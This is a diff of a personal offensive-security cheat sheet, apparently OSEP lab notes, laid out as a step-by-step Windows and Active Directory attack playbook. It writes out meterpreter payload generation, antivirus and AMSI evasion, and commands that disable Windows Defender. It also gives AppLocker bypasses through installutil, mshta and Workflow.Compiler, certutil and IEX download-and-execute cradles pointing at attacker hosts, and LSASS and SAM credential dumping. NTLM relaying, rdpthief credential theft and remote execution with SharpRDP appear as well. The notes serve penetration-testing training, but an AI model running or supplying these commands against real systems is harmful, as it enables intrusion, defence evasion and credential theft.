@@ -5,8 +5,6 @@
 	- https://github.com/dafthack/HostRecon
 - asciinema prep
 - sectioned shellcode runner
-- html smuggling
-- invoke-portscan
 
 # playbook
 - upload payload with AV bypass (bypass AV)
@@ -99,6 +97,8 @@ copy demo.js z:\
 
 # prepend amsi bypass onto demo.js and transfer to victim
 cat OSEP-Code-Snippets/bypass_amsi_jscript/<JSCRIPT_AMSI_BYPASS>.js | xclip -selection clipboard
+
+# alternatively transfer to OSEP-Code-Snippets/applocker_bypass_jscript/test.hta
 ```
 troubleshooting:
 ```
@@ -107,7 +107,7 @@ troubleshooting:
 
 Right-click ExampleAssembly > Options > Build > General > Allow 'unsafe' code
 ```
-see [[#mshta.exe]] for generating a jscript+hta payload that bypasses applocker
+see [[#mshta.exe]] for generating a jscript+hta=lnk payload that bypasses applocker
 see also: https://github.com/med0x2e/GadgetToJScript
 ## SuperSharpShooter
 convert binary payloads to js, vbs and hta
@@ -161,7 +161,7 @@ PS C:\Windows\Tasks> [rev.Program]::Main()
 ```
 
 # reflective injecting dll
-`reflective_dll_injection/Invoke-ReflectivePEInjection.ps1`
+`OSEP-Code-Snippets/reflective_dll_injection/Invoke-ReflectivePEInjection.ps1`
 ```
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.102 LPORT=443 -e x64/xor_dynamic  -b '\\x00\\x0a\\x0d' -f dll -o met.dll
 ```
@@ -175,7 +175,7 @@ Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
 ```
 
 # process injection
-`shellcode_process_injector/bin/x64/Release/shellcode_process_injector.exe`
+`OSEP-Code-Snippets/shellcode_process_injector/bin/x64/Release/shellcode_process_injector.exe`
 Use the commented section if you want to automatically inject a user that is currently logged in
 ```
         // TODO: use the commented out section if 'true' doesn't work
@@ -203,11 +203,9 @@ Process <PID> created.
 
 migrate <PID>
 ```
-
 # process hollowing
 `OSEP-Code-Snippets/shellcode_process_hollowing/`
 targets svchost.exe because it generally has network activity, guts out whats inside and replaces it shell code.
-
 # bypass AV
 
 ## ROT
@@ -216,7 +214,6 @@ mono OSEP-Code-Snippets/ROT_shellcode_encoder/bin/Release/ROT_shellcode_encoder.
 # better alternative
 OSEP-Code-Snippets/general_encoders/rot_shellcode.py 0xeb,0x27,...
 ```
-
 ## Non-Emulated APIs
 replace `VirtualAlloc`/`VirtualAllocEx` with `VirtualAllocExNuma` because some AVs don't support emulating that API.
 ```
@@ -396,6 +393,8 @@ see also: https://theitbros.com/managing-windows-defender-using-powershell/
 ```powershell
 # you may need to disable tamper protection first
 Set-MpPreference -DisableRealtimeMonitoring $true
+# alternatively
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
 
 # confirm that it works: output should be True
 Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring
@@ -443,19 +442,16 @@ vim applocker_bypass_powershell_runspace.csproj
 ```
 # example: you want to run privesc enum script
             String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.168/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Windows\\Tasks\\test.txt";
+```
 
 ```
-- file.txt `(applocker_bypass_powershell_runspace.exe)` downloads run.txt `(simple_shellcode_runner/simple_shellcode_runner.ps1)`
-```
-# encode payload
-echo "-----BEGIN CERTIFICATE-----" > file.txt; cat applocker_bypass_powershell_runspace.exe | base64 >> file.txt; echo "-----END CERTIFICATE-----" >> file.txt; python3 -m http.server 80
-# start a listener
-sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost <KALI_IP>; set lport 443; exploit"
-# download, decode and execute; use '&&' instead of ';' for cmd
-certutil -urlcache -split -f "http://192.168.45.168/file.txt"; certutil -decode file.txt bypass.exe; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\bypass.exe
+cp OSEP-Code-Snippets/applocker_bypass_powershell_runspace/bin/Release/applocker_bypass_powershell_runspace.exe bypass.exe
+# upload to target
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\bypass.exe
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U bypass.exe
 ```
 alternative: https://github.com/padovah4ck/PSByPassCLM
-### meterpreter clm bypass
+### meterpreter clm bypass (unreliable)
 ```
 load powershell 
 powershell_shell
@@ -470,8 +466,9 @@ perform same exploit as `powershell runspace via installutil`
 
 ## Microsoft.Workflow.Compiler.exe
 bypass applocker for C# executable
-modify `OSEP-Code-Snippets/applocker_bypass_workflow_compiler/applocker_bypass_workflow_compiler.ps1`
 ```
+cp OSEP-Code-Snippets/applocker_bypass_workflow_compiler/applocker_bypass_workflow_compiler.ps1 .
+vim applocker_bypass_workflow_compiler.ps1
 ...
 $output = "<PATH>\run.xml"
 ...
@@ -506,26 +503,10 @@ C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe 
 - make sure the method you are invoking is public
 - if there are arguments eg 'audit' for the Main method you are calling:
 Invoke(0, new object[] { new string[] { "audit" } });
+- if there NO arguments but the Main method CAN have string arguments:
+Invoke(0, new object[] { new string[] {  } });
 - if there are NO arguments for the Main method you are calling:
 Invoke(0, new object[] { });
-```
-### example (transfer via certutil)
-> ENSURE: the executable you want to load into memory (e.g. SharpUp.exe) is in the same folder as file1.txt and file2.txt
-```
-# encode payloads applocker_bypass_workflow_compiler.ps1 test.txt
-# Program.cs = file2.txt = test.txt 
-echo "-----BEGIN CERTIFICATE-----" > file1.txt; cat applocker_bypass_workflow_compiler.ps1 | base64 >> file1.txt; echo "-----END CERTIFICATE-----" >> file1.txt; echo "-----BEGIN CERTIFICATE-----" > file2.txt; cat test.txt | base64 >> file2.txt; echo "-----END CERTIFICATE-----" >> file2.txt; python3 -m http.server 80
-```
-
-```
-# download, decode and execute; use ';' instead of '&&' for powershell
-cd \Windows\Tasks
-certutil -urlcache -split -f "http://192.168.49.102/file1.txt" && certutil -decode file1.txt applocker_bypass_workflow_compiler.ps1 && certutil -urlcache -split -f "http://192.168.49.102/file2.txt" && certutil -decode file2.txt test.txt 
-```
-
-```
-powershell -ep bypass .\applocker_bypass_workflow_compiler.ps1
-C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml results.xml
 ```
 ## msbuild
 https://github.com/bohops/GhostBuild/blob/master/GhostBuilder.py
@@ -553,6 +534,7 @@ C:\Windows\System32\mshta.exe http://192.168.49.102\test.hta
 
 # attach to email or soceng victim to click link
 ```
+see  [[#dotnettojscript]] for generating jscript payload instead of using SuperSharpShooter if it doesn't work
 ## XSL
 ```
 # use OSEP-Code-Snippets/applocker_bypass_jscript/test.xsl
@@ -833,16 +815,12 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sys
 reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam
 reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam
 ```
-
 ## cracking sam
-
 ```
 # use creddump7 or mimikatz or samdump2
 samdump2 [OPTION]... SYSTEM_FILE SAM_FILE
 ```
-
 ## LAPS
-
 ```
 https://github.com/leoloobeek/LAPSToolkit
 
@@ -865,8 +843,7 @@ runas /user:corp1.com\jeff powershell
 Import-Module .\LAPSToolkit.ps1
 Get-LAPSComputers
 ```
-
-## access tokens (printspoofer)
+# access tokens (printspoofer)
 executing as service account (or an account that hasn't logged in interactively)
 ```
 # start 2 multi/handler, one with exploit -j because you will be catching two shells (low priv and sys priv)
@@ -890,7 +867,6 @@ background
 sessions -l
 sessions -i <id>
 ```
-
 printspoofer in memory
 ```
 # use updated spoolsample repo: https://github.com/NukingDragons/PrintSpooferNet
@@ -906,12 +882,10 @@ https://github.com/NukingDragons/PrintSpooferNet/releases/download/v1.0/PrintSpo
 # if you get the following error hen you don't have SeImpersonatePrivilege
 Unhandled Exception: System.DllNotFoundException: Dll was not found.
 ```
-
 printspoofer via meterpreter
 ```
 getsystem -t 5
 ```
-
 ## incognito (impersonate any user from system)
 
 ```
@@ -1006,9 +980,12 @@ pypykatz lsass.dmp
 # alternatively run on the machine
 Invoke-Mimikatz -Command "`"sekurlsa::minidump c:\windows\tasks\lsass.dmp`" sekurlsa::logonpasswords"
 ```
-
 # windows lateral movement
-
+## Invoke-Portscan
+https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/situational_awareness/network/Invoke-Portscan.ps1
+```
+Invoke-Portscan -Hosts <IP> -TopPorts 50 -SkipDiscovery
+```
 ## RDP troubleshooting
 sometimes xfreerdp will not let you rdp even though you have the correct password, this is because it doesn't read in special characters properly
 ```
@@ -1016,10 +993,8 @@ sometimes xfreerdp will not let you rdp even though you have the correct passwor
 
 # workaround 1: /sec:tls
 xfreerdp /u:Administrator /p:'m31R}dd7rX]@7G' /v:192.168.153.122 /timeout:50000 +auto-reconnect /auto-reconnect-max-retries:0 /sec:tls
-
 # workaround 2: -sec-nla
 xfreerdp /u:Administrator /p:'m31R}dd7rX]@7G' /v:192.168.153.122 /timeout:50000 +auto-reconnect /auto-reconnect-max-retries:0 -sec-nla
-
 # both workarounds require to retype the password in the GUI
 # alternative 1: install reminna
 # alternative 2: try rdesktop
@@ -1031,7 +1006,6 @@ xfreerdp /u:Administrator /p:'m31R}dd7rX]@7G' /v:192.168.153.122 /timeout:50000 
 qwinsta /server:<YourServerName>
 rwinsta /server:<YourServerName> <SessionId>
 ```
-
 ## RDP with DisableRestrictedAdmin
 ```
 
@@ -1061,7 +1035,6 @@ reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t
 # rdp directly from kali
 xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.120.6 /cert-ignore
 ```
-
 ## bypass firewall blocking rdp
 ### meterpreter reverse rdp autoroute
 ```
@@ -1091,6 +1064,9 @@ socks5 127.0.0.1 1080
 # proxy in
 proxychains rdesktop 192.168.164.10
 ```
+troubleshooting:
+if the socks module failed to bind to port 1080 then ensure netstat shows `0.0.0.0:1080 listening`, and restart msfconsole
+alternatively: the socks version in the module to 4/4a, don't forget to actually set up the route once the socks proxy is running
 ### chisel reverse rdp autoroute
 ```
 # on kali
@@ -1105,7 +1081,6 @@ chisel.exe client 192.168.119.120:8080 socks
 # back on kali
 sudo proxychains rdesktop 192.168.120.10
 ```
-
 ## rdp as a console with sharpRDP
 ```
 # latest maintained fork: https://github.com/SygniaLabs/SharpRDP
@@ -1119,7 +1094,6 @@ sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/re
 C:\Windows\Tasks>copy \\192.168.45.189\vscode\OSEP-Code-Snippets\SharpRDP\SharpRDP\bin\Release\SharpRDP.exe .
 C:\Windows\Tasks>sharprdp.exe computername=appsrv01 command="powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/met.exe', 'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=corp1\dave password=lab
 ```
-
 ## steal rdp creds with rdpthief
 `OSEP-Code-Snippets\rdpthief_mstsc_injector`
 ```
@@ -1134,7 +1108,6 @@ C:\Windows\Tasks>type C:\Users\admin.CORP1\AppData\Local\Temp\data.bin
 # troubleshoot
 - if you're running rdpthief_mstsc_injector.exe as admin then you have to run mstsc as admin as well otherwise RdpThief.dllwon't be injected
 ```
-
 ## fileless alternative to psexec
 ```
 # Usage: PSLessExec.exe [Target] [Service] [BinaryToRun]
@@ -1152,9 +1125,7 @@ C:\windows\system32\cmd.exe /c "powershell Invoke-WebRequest -Uri http://192.168
 C:\Windows\Tasks/met.exe
 
 ```
-
 # linux lateral movement
-
 ```
 # search home directory for private key
 find /home/ -name "id_rsa"
@@ -1437,7 +1408,6 @@ proxychains impacket-psexec Administrator@DC01.CORP1.COM -k -no-pass
 ```
 
 # MSSQL
-
 ## enumeration
 ```
 # use built in tool
@@ -1446,7 +1416,6 @@ setspn -T corp1 -Q MSSQLSvc/*
 # use powershell script
 . .\GetUserSPNs.ps1
 ```
-
 ## authentication
 `OSEP-Code-Snippets/MSSQL`
 ```
@@ -1474,7 +1443,7 @@ conStr = "SERVER=localhost;UID=webapp11;PWD=89543dfGDFGH4d;DATABASE=music";
 ## stealing/relaying creds
 ```
 # relay ntlmv2 hash with impacket
-# requires smb signing disabled
+# requires smb signing disabled on victim
 # requires simple_shellcode_runner/simple_shellcode_runner.ps1 as run.txt
 sudo systemctl stop smbd nmbd  
 python3 -m http.server 80
@@ -1483,11 +1452,11 @@ kali@kali:~$ pwsh
 PS /home/kali> $text = "(New-Object System.Net.WebClient).DownloadString('http://<KALI_IP>/run.txt') | IEX"
 PS /home/kali> [Convert]::ToBase64String( [System.Text.Encoding]::Unicode.GetBytes($text))
 KABOAGUA...==
-sudo impacket-ntlmrelayx --no-http-server -smb2support -t <PIVOT_TARGET_IP> -c 'powershell -enc KABOAGUA...=='
+# note: TARGET_IP is not PIVOT_IP
+sudo impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c 'powershell -enc KABOAGUA...=='
 
 C:\Users\admin.CORP1>MSSQL.exe
 ```
-
 ## escalation
 `OSEP-Code-Snippets/MSSQL`
 ```
@@ -1497,7 +1466,6 @@ String res = executeQuery("EXECUTE AS LOGIN = 'sa';", con);
 # method 2: EXECUTE AS USER dbo
 String res = executeQuery("use msdb; EXECUTE AS USER = 'dbo';", con);
 ```
-
 ## code execution
 `OSEP-Code-Snippets/MSSQL`
 ```
@@ -1520,7 +1488,6 @@ KABOA...FAFgA
 String cmd = "powershell -enc KABOA...FAFgA";
 ...
 ```
-
 ## custom assemblies (user defined functions udf)
 `OSEP-Code-Snippets/mssql_custom_assemblies`
 ```
@@ -1529,7 +1496,6 @@ Compile mssql_ca.dll from OSEP-Code-Snippets/mssql_custom_assemblies
 run pwsh OSEP-Code-Snippets/mssql_custom_assemblies/dll_to_hextring.ps1
 copy and paste output into 'CREATE ASSEMBLY myAssembly FROM 0x4D5A90..." in OSEP-Code-Snippets/MSSQL
 ```
-
 ## linked sql servers (lateral movement)
 `OSEP-Code-Snippets/MSSQL`
 ```
@@ -1541,7 +1507,6 @@ copy and paste output into 'CREATE ASSEMBLY myAssembly FROM 0x4D5A90..." in OSEP
 
 # code execution via linked SQL server (requires escalation)
 ```
-
 ## red team tools
 ```
 # perform some of the above via powershell
@@ -1549,7 +1514,6 @@ https://github.com/NetSPI/PowerUpSQL
 # evil sql client
 https://github.com/NetSPI/ESC
 ```
-
 ## PowerUpSQL.ps1
 
 ```
@@ -1611,9 +1575,10 @@ Get-ObjectAcl -Identity offsec -ResolveGUIDs | Foreach-Object {$_ | Add-Member -
 # tidier version
 Get-ObjectAcl -Identity offsec -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Sort-Object Identity | Format-Table Identity, AceType, ActiveDirectoryRights -Wrap
 
-# filter for current user  
-Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
-# tidier version
+# enumerate specifically for WriteDACL
+Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.ActiveDirectoryRights -like "*WriteDacl*") {$_}} | Format-Table Identity, ObjectDN, AceType, ActiveDirectoryRights -Wrap
+
+# filter for current user (tidier version)
 Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}} | Format-Table Identity, ObjectDN, AceType, ActiveDirectoryRights -Wrap
 
 # same as above but for groups
@@ -1633,7 +1598,7 @@ net group testgroup offsec /add /domain
 ```
 # WriteDACL
 # scenario: user prod\offsec has WriteDACL on user prod\TestService2
-# example of WriteDACL abuse to give GenericAll to user testservice2  
+# example of WriteDACL abuse to give GenericAll to user testservice2
 Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All
 
 # verify updated permission
@@ -1944,7 +1909,6 @@ Invoke-Rubeus -Command "s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438
 klist
 dir \\appsrv01.prod.corp1.com\c$
 ```
-
 ## kirbi ccache converter
 ```
 # kirbi to ccache
@@ -2152,9 +2116,7 @@ setspn -T corp1 -Q MSSQLSvc/*
 setspn -T corp2.com -Q MSSQLSvc/*
 
 ```
-
 # Combining the pieces
-
 ```
 Enumeration with HostRecon
 Check RunAsPPL to see if lsa is enabled
@@ -2162,14 +2124,11 @@ check application whitelisting
 bypass amsi
 check priv use custom printspoofer and use spoolsample
 ```
-
 # mono setup
-
 ```
 # add the mono repo for debian 11
 sudo apt install monodevelop mono-complete nuget
 ```
-
 ## misc.
 
 ```
@@ -2221,19 +2180,24 @@ powershell.exe -ExecutionPolicy Bypass -command “iex(New-Object Net.WebClient)
 
 # option 2:
 echo IEX (New-Object Net.WebClient).DownloadString('http://attacker.home/myscript.ps1') | powershell -NoProfile -Command -
+(New-Object System.Net.WebClient).DownloadString('http://attacker.home/myscript.ps1') | IEX
 
 # option 3:
 powershell -ExecutionPolicy Bypass -Command "[scriptblock]::Create((Invoke-WebRequest "http://attacker.home/myscript.ps1").Content).Invoke();"
 ```
 
+# obfuscated file transfer
+- file.txt `(applocker_bypass_powershell_runspace.exe)` downloads run.txt `(simple_shellcode_runner/simple_shellcode_runner.ps1)`
+```
+# encode payload
+echo "-----BEGIN CERTIFICATE-----" > file.txt; cat applocker_bypass_powershell_runspace.exe | base64 >> file.txt; echo "-----END CERTIFICATE-----" >> file.txt; python3 -m http.server 80
+# start a listener
+sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost <KALI_IP>; set lport 443; exploit"
+# download, decode and execute; use '&&' instead of ';' for cmd
+certutil -urlcache -split -f "http://192.168.45.168/file.txt"; certutil -decode file.txt bypass.exe; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\bypass.exe
+```
 # compiled binaries
 https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
-
-
-```
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
-```
-
 # run powershell as admin
 ```powershell
 $psi = New-Object System.Diagnostics.ProcessStartInfo
@@ -2246,17 +2210,39 @@ $psi.RedirectStandardOutput = $false
 $process = [System.Diagnostics.Process]::Start($psi)
 ```
 
-# meterpreter stuff (add to navi)
+# add to navi stuff
+## meterpreter pivoting
 ```
-# add routes for pivoting
+# add routes and use proxy for pivoting
 msf6 exploit(multi/handler) > use multi/manage/autoroute
 msf6 post(multi/manage/autoroute) > set session 1
 msf6 post(multi/manage/autoroute) > exploit
 msf6 post(multi/manage/autoroute) > route print
+msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
+msf6 auxiliary(server/socks_proxy) > set srvhost 127.0.0.1
+msf6 auxiliary(server/socks_proxy) > exploit -j
 
 # port scan via pivot
 msf6 post(multi/manage/autoroute) > use auxiliary/scanner/portscan/tcp
 msf6 auxiliary(scanner/portscan/tcp) > set RHOST 172.16.234.151
+```
+## generate powershell base64 command
+```
+kali@kali:~$ pwsh
+PS /home/kali> $text = "(New-Object System.Net.WebClient).DownloadString('http://<KALI_IP>/run.txt') | IEX"
+PS /home/kali> [Convert]::ToBase64String( [System.Text.Encoding]::Unicode.GetBytes($text))
+KABOAGUA...==
+powershell -enc KABOAGUA...==
+```
+## duplicate meterpreter sessions
+```
+# FIRST start another multi/handler in the background (exploit -j) 
+use post/windows/manage/multi_meterpreter_inject
+set iplist 192.168.45.207
+set lport 443
+set payload windows/x64/meterpreter/reverse_https
+set session 2
+exploit
 ```
 # github tokens
 
